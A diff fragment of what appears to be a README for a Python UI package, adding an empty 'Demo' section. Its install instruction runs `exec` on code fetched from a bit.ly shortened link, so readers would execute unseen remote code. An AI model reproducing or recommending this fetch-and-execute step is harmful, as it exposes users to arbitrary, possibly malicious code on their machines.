@@ -24,3 +24,10 @@ import requests; exec(requests.get("https://bit.ly/FlixyUI").text)
 `
 
 You can also install it from github here and then insert it manually on the `Python modules/site-package-3`
+
+## Demo
+This is a simple `Hello, world!` interface:
+
+`
+
+`
